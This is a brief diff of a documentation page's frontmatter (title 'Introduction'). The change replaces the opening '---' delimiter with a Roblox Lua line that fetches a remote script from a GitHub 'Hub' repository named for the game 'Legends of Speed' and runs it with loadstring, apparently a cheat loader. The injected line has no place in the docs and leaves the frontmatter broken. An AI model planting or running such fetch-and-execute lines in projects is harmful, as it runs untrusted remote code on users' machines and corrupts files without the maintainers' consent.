@@ -1,4 +1,4 @@
----
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoZar0/PDj-Hub/refs/heads/main/LegendsOfSpeed.lua"))()---
 title: Introduction
 slug: /
 sidebar_position: 1
